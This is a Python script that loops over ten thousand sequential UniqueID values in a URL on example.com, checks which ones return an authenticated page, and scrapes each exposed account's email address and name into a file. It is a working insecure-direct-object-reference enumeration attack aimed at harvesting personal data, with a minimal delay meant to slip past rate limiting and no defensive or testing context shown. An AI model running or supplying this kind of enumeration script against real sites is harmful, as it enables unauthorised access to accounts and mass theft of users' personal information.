import requests
from bs4 import BeautifulSoup
import time
import re

# Function to check if a UniqueID grants access and extract account details
def check_unique_id(unique_id):
    url = f"https://example.com/en/?UniqueID={unique_id}"
    try:
        response = requests.get(url)
        # Debug output to check response
        print(f"Checked UniqueID {unique_id}, status code: {response.status_code}")
        if response.status_code == 200:
            # Check if access is granted
            if "authenticated" in response.text:
                # Debug output for authentication
                print(f"Authentication found for UniqueID {unique_id}")

                # Parse the response to extract information
                soup = BeautifulSoup(response.text, 'html.parser')

                # Extract email address using a regex
                email = None
                email_match = re.search(r'[\w\.-]+@[\w\.-]+', response.text)
                if email_match:
                    email = email_match.group(0)

                # Extract name (assuming it's within a specific HTML tag, adjust as necessary)
                name = None
                name_tag = soup.find('span', class_='username')  # Adjust the tag and class as per the actual HTML
                if name_tag:
                    name = name_tag.text.strip()

                # Debug output for extracted data
                print(f"Extracted data for UniqueID {unique_id}: email={email}, name={name}")

                account_info = {
                    "unique_id": unique_id,
                    "email": email,
                    "name": name
                }
                return account_info
            else:
                print(f"No authentication found for UniqueID {unique_id}")
        else:
            print(f"Failed to retrieve UniqueID {unique_id}, status code: {response.status_code}")
    except Exception as e:
        print(f"Error with UniqueID {unique_id}: {e}")
    return None

# Set the central unique ID and the range around it
central_id = 40000
range_size = 5000

# Calculate the start and end IDs
start_id = central_id - range_size
end_id = central_id + range_size

# List to store results
results = []

# Open a file to save intermediate results
with open('account_info.txt', 'w') as f:
    for unique_id in range(start_id, end_id + 1):
        account_info = check_unique_id(unique_id)
        if account_info:
            results.append(account_info)
            # Save intermediate results to file
            f.write(f"{account_info}\n")
            f.flush()  # Ensure data is written to file immediately

        # Print progress every 10 IDs
        if unique_id % 10 == 0:
            print(f"Checked UniqueID {unique_id}")

        time.sleep(0.001)  # Delay to avoid rate limiting (adjust as needed)

# Print final results
for result in results:
    print(result)